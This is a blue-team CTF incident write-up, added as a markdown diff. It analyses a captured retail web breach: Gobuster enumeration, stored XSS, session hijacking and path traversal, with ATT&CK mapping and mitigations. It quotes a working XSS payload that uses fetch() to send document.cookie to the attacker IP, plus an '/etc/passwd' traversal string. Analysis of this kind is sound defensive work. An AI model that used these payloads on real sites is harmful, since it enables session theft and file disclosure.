@@ -1,0 +1,70 @@
+# Retail Breach CTF
+[Blue Team CTF](https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/)
+
+##### Who is the attacker?
+First step on my analysis is going through NetworkMiner to found who Hosts at this traffic. NetworkMiner found 3 Hosts from this pcap file. then I directly going to display Host Details on the IP that suspected as attacker in `111.224.180.128` then found a bunch of technique that this host doing through network. such as brute forced vulnerabilities directory that victim have.
+
+##### What is attacker doing
+From my first analyse the attacker doing bruteforcing our webserver directory through tools gobuster that have function to enumerating our directory.
+
+then i go to Wireshark for further http analyse this packet. i filtered with `http.request.method` to find what this attacker doing. then i found the attacker  doing brute forcing is finished, the attacker exploit the vulnerabilities with stored XSS to get cookies user using 
+`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
+
+##### When it happened?
+the injection has doing since user visited to containing page at 2024-03-29 12:09, the attacker upload this injection at 2024-03-29 12:07
+
+##### Why it Happened?
+the review form input not sanitized the attacker can doing XSS and stole the cookie from the user that value `lqkctf24s9h9lg67teu8uevn3q`. from that the attacker can have access to exploit the another vulnerabilities file that we found their exploiting log_viewer.php to get RCE. after get the RCE they exploiting a stored database password on our server using command `../../../../../etc/passwd`
+
+##### How it happened?
+###### MITRE ATT&CK 
+Technique
+Reconnaisance : Active Scanning > Wordlist = T1595.003 
+Initial Access : Exploit Public-Facing Application = T1190
+Execution : Malicious Link T1204.001 Javascript T1059.007
+Credential Access : 
+	Steal Web Session Cookies T1539
+	OS Credential Dumping T1003.008
+	Local Accounts T1087.001
+Exfiltration :
+	Exfiltration Over C2 T1041
+	Non C2 Protocol T1048.003
+
+## Revision File
+
+##### **Who is the Attacker?**
+
+Initial host discovery using NetworkMiner identified three hosts within the captured traffic. Detailed host inspection revealed suspicious scanning and enumeration activity originating from **`111.224.180.128`**, confirming this IP as the external threat actor.
+
+
+##### **What is the Attacker Doing?**
+
+The attacker initiated reconnaissance by brute-forcing and enumerating web directories using **Gobuster** (identified via User-Agent and high-frequency HTTP requests in Wireshark). Following enumeration, the attacker exploited a **Stored XSS** vulnerability on the customer review page by injecting a malicious JavaScript payload:
+
+```html
+<script>fetch('http://111.224.180.128/' + document.cookie);</script>
+```
+
+##### **When Did It Happen? (Timeline)**
+- **2024-03-29 12:07 UTC:** Attacker submitted the payload via the unvalidated review form (Stored XSS injected).
+- **2024-03-29 12:09 UTC:** A legitimate authenticated user visited the compromised page, triggering execution of the payload and sending their session cookie (`lqkctf24s9h9lg67teu8uevn3q`) to the attacker.
+
+##### **Why & How It Happened? (Root Cause & Impact)**
+
+The root cause was a **lack of input validation and sanitization** on the review form, paired with missing `HttpOnly` flags on session cookies. With the stolen cookie, the attacker performed **Session Hijacking** to authenticate as the privileged user. Through this session, the attacker accessed an internal administrative component (`log_viewer.php`) and exploited a **Local File Inclusion / Path Traversal** vulnerability (`../../../../../etc/passwd`) to enumerate local system user accounts.
+###### MITRE ATT&CK
+
+| Tactic                | Technique ID | Technique Name                                | Context in Incident                                        |
+| --------------------- | ------------ | --------------------------------------------- | ---------------------------------------------------------- |
+| **Reconnaissance**    | T1595.003    | Active Scanning: Wordlist Scanning            | Gobuster directory brute-forcing                           |
+| **Initial Access**    | T1190        | Exploit Public-Facing Application             | Stored XSS on the public review form                       |
+| **Execution**         | T1059.007    | Command and Scripting Interpreter: JavaScript | Malicious inline fetch script execution                    |
+| **Credential Access** | T1539        | Steal Web Session Cookie                      | Exfiltrated cookie without `HttpOnly` flag                 |
+| **Discovery**         | T1087.001    | Account Discovery: Local Accounts             | Enumerated user accounts via `/etc/passwd`                 |
+| **Collection**        | T1005        | Data from Local System                        | Arbitrary file read via Path Traversal in `log_viewer.php` |
+| **Exfiltration**      | T1048.003    | Exfiltration Over Unencrypted Non-C2 Protocol | Stolen cookie sent via HTTP GET to attacker IP             |
+##### Mitigation
+
+- Applying _HTML sanitization_ / _output encoding_ input review form.
+- Activate flag `HttpOnly` and `SameSite=Strict` on cookie session that JavaScript can't read `document.cookie`
+- Validating and sanitaziton input path (whitelisting) on `log_viewer.php` for mitigate LFI/Directory Traversal.
